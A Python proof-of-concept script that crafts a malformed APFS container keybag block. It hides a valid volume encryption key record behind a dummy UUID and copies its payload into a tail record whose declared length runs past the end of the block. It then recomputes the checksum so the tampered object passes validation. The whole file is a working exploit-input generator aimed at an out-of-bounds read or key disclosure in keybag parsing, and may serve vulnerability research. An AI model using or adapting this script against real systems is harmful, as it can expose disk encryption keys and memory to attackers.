#!/usr/bin/env python3
"""Move a valid APFS VEK record to a malformed tail disclosure record."""

from __future__ import annotations

import argparse
import pathlib
import struct
import uuid

from craft_keybag_span import aligned_entry_span, fletcher64, u16, u32


BLOCK_SIZE = 0x4000
BAG_OFFSET = 0x20
ENTRY_HEADER_SIZE = 0x18
TARGET_OFFSET = 0x3F60
DEFAULT_DECLARED_PAYLOAD_LENGTH = 0x200
BOUNDARY_MARKER = b"CODXBOUNDARY"
DUMMY_UUID = uuid.UUID("434f4445-582d-4455-4d4d-592d55554944")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("input", type=pathlib.Path)
    parser.add_argument("output", type=pathlib.Path)
    parser.add_argument("--uuid", type=uuid.UUID, required=True)
    parser.add_argument("--type", type=lambda value: int(value, 0), default=2)
    parser.add_argument(
        "--declared-length",
        type=lambda value: int(value, 0),
        default=DEFAULT_DECLARED_PAYLOAD_LENGTH,
    )
    args = parser.parse_args()

    block = bytearray(args.input.read_bytes())
    if len(block) != BLOCK_SIZE or block[0x18:0x1C] != b"syek":
        raise SystemExit("input is not one 0x4000-byte container 'keys' object")
    if fletcher64(block) != struct.unpack_from("<Q", block, 0)[0]:
        raise SystemExit("input object checksum is invalid")
    if not 0 <= args.type <= 0xFFFF:
        raise SystemExit("record type must fit uint16_t")
    if not 0 <= args.declared_length <= 0xFFFF:
        raise SystemExit("declared length must fit uint16_t")

    count = u16(block, BAG_OFFSET + 2)
    total_length = u32(block, BAG_OFFSET + 4)
    cursor = BAG_OFFSET + 0x10
    match = None
    for index in range(count):
        payload_length = u16(block, cursor + 0x12)
        span = aligned_entry_span(payload_length)
        record_uuid = uuid.UUID(bytes=bytes(block[cursor:cursor + 0x10]))
        record_type = u16(block, cursor + 0x10)
        print(
            f"entry[{index}] absolute={cursor:#x} uuid={str(record_uuid).upper()} "
            f"type={record_type} payload={payload_length:#x} span={span:#x}"
        )
        if record_uuid == args.uuid and record_type == args.type:
            if match is not None:
                raise SystemExit("multiple matching source records")
            match = (cursor, payload_length)
        cursor += span
    if cursor != BAG_OFFSET + total_length:
        raise SystemExit("existing entries do not end at the declared bag end")
    if match is None:
        raise SystemExit("matching source record not found")

    source_offset, source_length = match
    source_payload = bytes(
        block[source_offset + ENTRY_HEADER_SIZE:
              source_offset + ENTRY_HEADER_SIZE + source_length]
    )
    in_block_payload = BLOCK_SIZE - (TARGET_OFFSET + ENTRY_HEADER_SIZE)
    if len(source_payload) + len(BOUNDARY_MARKER) > in_block_payload:
        raise SystemExit("valid payload and boundary marker do not fit in block")

    # Keep the source record structurally valid but make it nonmatching, so the
    # lookup walks through it to the malformed tail copy of the real payload.
    block[source_offset:source_offset + 0x10] = DUMMY_UUID.bytes

    filler_offset = cursor
    filler_span = TARGET_OFFSET - filler_offset
    filler_payload_length = filler_span - ENTRY_HEADER_SIZE
    if aligned_entry_span(filler_payload_length) != filler_span:
        raise SystemExit("filler geometry is not exactly representable")

    block[filler_offset:] = b"\0" * (BLOCK_SIZE - filler_offset)
    filler_uuid = uuid.UUID("46494c4c-4552-4649-4c4c-455246494c4c")
    block[filler_offset:filler_offset + 0x10] = filler_uuid.bytes
    struct.pack_into("<H", block, filler_offset + 0x10, 0x77)
    struct.pack_into("<H", block, filler_offset + 0x12, filler_payload_length)

    block[TARGET_OFFSET:TARGET_OFFSET + 0x10] = args.uuid.bytes
    struct.pack_into("<H", block, TARGET_OFFSET + 0x10, args.type)
    struct.pack_into("<H", block, TARGET_OFFSET + 0x12, args.declared_length)
    payload_start = TARGET_OFFSET + ENTRY_HEADER_SIZE
    block[payload_start:payload_start + len(source_payload)] = source_payload
    marker_start = payload_start + len(source_payload)
    block[marker_start:marker_start + len(BOUNDARY_MARKER)] = BOUNDARY_MARKER

    declared_total = BLOCK_SIZE - BAG_OFFSET
    struct.pack_into("<H", block, BAG_OFFSET + 2, count + 2)
    struct.pack_into("<I", block, BAG_OFFSET + 4, declared_total)
    struct.pack_into("<Q", block, 0, fletcher64(block))

    target_span = aligned_entry_span(args.declared_length)
    payload_beyond = max(payload_start + args.declared_length - BLOCK_SIZE, 0)
    print(
        f"source absolute={source_offset:#x} payload={source_length:#x} "
        f"neutralized_uuid={str(DUMMY_UUID).upper()}; "
        f"filler absolute={filler_offset:#x} payload={filler_payload_length:#x} "
        f"span={filler_span:#x}; target absolute={TARGET_OFFSET:#x} "
        f"payload={args.declared_length:#x} span={target_span:#x}; "
        f"in_block_payload={in_block_payload:#x} payload_beyond={payload_beyond:#x} "
        f"count={count + 2} total={declared_total:#x} "
        f"checksum={struct.unpack_from('<Q', block, 0)[0]:#x}"
    )
    args.output.write_bytes(block)


if __name__ == "__main__":
    main()
